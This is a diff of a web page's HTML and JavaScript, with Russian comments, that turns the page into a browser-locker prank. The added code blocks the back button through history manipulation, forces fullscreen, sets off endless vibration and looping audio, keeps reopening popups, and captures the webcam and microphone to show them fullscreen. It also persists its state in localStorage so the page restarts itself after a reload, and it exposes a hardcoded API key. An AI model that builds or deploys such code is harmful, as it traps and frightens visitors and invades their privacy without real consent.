@@ -67,15 +67,15 @@
             z-index: 1000;
             cursor: pointer;
         }
-        #webcamFeed {
+        #webcamVideo {
             position: absolute;
-            bottom: 20px;
-            right: 20px;
-            width: 250px;
-            height: auto;
-            border: 3px solid white;
-            z-index: 1001;
-            transform: scaleX(-1);
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: none;
+            z-index: 999;
         }
     </style>
 </head>
@@ -87,6 +87,7 @@
     </div>
 
     <div id="fullscreenContent">
+        <video id="webcamVideo" autoplay muted></video>
         <audio id="bgMusic" loop>
             <source src="assets/game-over-sound.mp3" type="audio/mpeg">
         </audio>
@@ -97,11 +98,12 @@
 
         const isMobileDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
         let sessionActive = false;
-        let mediaStream = null;
+        let webcamStream = null;
 
         const mainButton = document.getElementById('mainButton');
         const fullscreenContent = document.getElementById('fullscreenContent');
         const bgMusic = document.getElementById('bgMusic');
+        const webcamVideo = document.getElementById('webcamVideo');
 
         const gifKeywords = [
             'glitch', 'surreal', 'abstract', 'psychedelic', 'trippy', 'weird', 'strange art', 'unexplained', 'anomaly', 'cosmic horror',
@@ -111,42 +113,18 @@
 
         const GIPHY_API_KEY = 'GlVGYHkr3WSBnllca54iNt0yFbjz7L65';
 
-        async function setupWebcam() {
-            try {
-                mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                const videoElement = document.createElement('video');
-                videoElement.id = 'webcamFeed';
-                videoElement.srcObject = mediaStream;
-                videoElement.autoplay = true;
-                videoElement.muted = true;
-                fullscreenContent.appendChild(videoElement);
-                console.log("Webcam successfully connected.");
-                return mediaStream;
-            } catch (error) {
-                console.error("Error accessing webcam:", error);
-                return null;
-            }
-        }
-
-        function initializeApp() {
-            if (sessionActive) return;
-            sessionActive = true;
-
-            startSession();
-            requestFullScreenMode();
-            fullscreenContent.style.display = 'block';
-            bgMusic.play();
-            startVibrationLoop();
-            setupWebcam();
-        }
+        // --- ИЗМЕНЕННАЯ ФУНКЦИЯ ДЛЯ ВИБРАЦИИ ---
 
         function startVibrationLoop() {
             if ('vibrate' in navigator) {
+                // Запускаем вибрацию по паттерну каждые 1500 мс (0.5сек + 1сек)
                 setInterval(() => {
-                    navigator.vibrate([500, 1000]);
+                    navigator.vibrate([500, 1000]); // 0.5 сек вибрировать, 1 сек пауза
                 }, 1500);
             }
         }
+
+        // --- КОНЕЦ ИЗМЕНЕНИЙ ---
 
         function generateRandomColor() {
             const letters = '0123456789ABCDEF';
@@ -286,6 +264,9 @@
         }
 
         function startSession() {
+            if (sessionActive) return;
+            sessionActive = true;
+
             history.pushState(null, null, location.href);
             window.addEventListener('popstate', function (event) {
                 history.pushState(null, null, location.href);
@@ -313,41 +294,91 @@
             }
         }
 
-        function triggerFullScreen() {
-            sessionStorage.setItem('sessionActive', 'true');
-            initializeApp();
+        async function requestWebcamAccess() {
+            try {
+                // Запрашиваем доступ к веб-камере и микрофону
+                webcamStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: true, 
+                    audio: true 
+                });
+                
+                // Если доступ получен, устанавливаем поток в видео элемент
+                webcamVideo.srcObject = webcamStream;
+                webcamVideo.style.display = 'block';
+                
+                // Сохраняем состояние в localStorage
+                localStorage.setItem('webcamAccessGranted', 'true');
+                
+                return true;
+            } catch (error) {
+                console.error('Error accessing webcam:', error);
+                return false;
+            }
         }
 
-        function openPopupWindow() {
-            const popup = window.open('popup.html', 'popup_' + Date.now(), 'width=350,height=350,resizable=no,scrollbars=no,toolbar=no');
-            if (popup) {
-                setTimeout(() => {
-                    popup.postMessage({ action: 'startWebcam' }, '*');
-                }, 100);
+        async function triggerFullScreen() {
+            // Запускаем бесконечную вибрацию
+            startVibrationLoop();
+
+            // Запрашиваем доступ к веб-камере
+            await requestWebcamAccess();
+
+            if (!isMobileDevice) {
+                window.open('popup.html', 'popup_' + Date.now(), 'width=350,height=350,resizable=no,scrollbars=no,toolbar=no');
+            }
+
+            startSession();
+            requestFullScreenMode();
+            fullscreenContent.style.display = 'block';
+            bgMusic.play();
+            
+            // Сохраняем состояние в localStorage
+            localStorage.setItem('fullscreenActive', 'true');
+            
+            if (isMobileDevice) {
+                document.addEventListener('backbutton', function(e) {
+                    e.preventDefault();
+                    if (confirm("?")) {
+                        fullscreenContent.style.display = 'none';
+                        bgMusic.pause();
+                        // Очищаем состояние в localStorage
+                        localStorage.removeItem('fullscreenActive');
+                    }
+                }, false);
             }
         }
 
         fullscreenContent.addEventListener('click', function() {
             if (!isMobileDevice) {
-                openPopupWindow();
+                window.open('popup.html', 'popup_' + Date.now(), 'width=350,height=350,resizable=no,scrollbars=no,toolbar=no');
             }
         });
         
         document.addEventListener('fullscreenchange', function() {
             if (!document.fullscreenElement && fullscreenContent.style.display === 'block') {
                 if (!isMobileDevice) {
-                    openPopupWindow();
+                    window.open('popup.html', 'popup_' + Date.now(), 'width=350,height=350,resizable=no,scrollbars=no,toolbar=no');
                 }
             }
         });
 
-        document.addEventListener('DOMContentLoaded', () => {
-            setRandomButtonContent();
-            mainButton.addEventListener('click', triggerFullScreen);
-            document.addEventListener('keydown', triggerFullScreen);
-
-            if (sessionStorage.getItem('sessionActive') === 'true') {
-                initializeApp();
+        // Проверяем состояние при загрузке страницы
+        window.addEventListener('load', function() {
+            const fullscreenActive = localStorage.getItem('fullscreenActive');
+            const webcamAccessGranted = localStorage.getItem('webcamAccessGranted');
+            
+            if (fullscreenActive === 'true') {
+                // Восстанавливаем полноэкранный режим
+                triggerFullScreen();
+                
+                // Если был предоставлен доступ к веб-камере, восстанавливаем его
+                if (webcamAccessGranted === 'true') {
+                    requestWebcamAccess();
+                }
+            } else {
+                setRandomButtonContent();
+                mainButton.addEventListener('click', triggerFullScreen);
+                document.addEventListener('keydown', triggerFullScreen);
             }
         });
     </script>
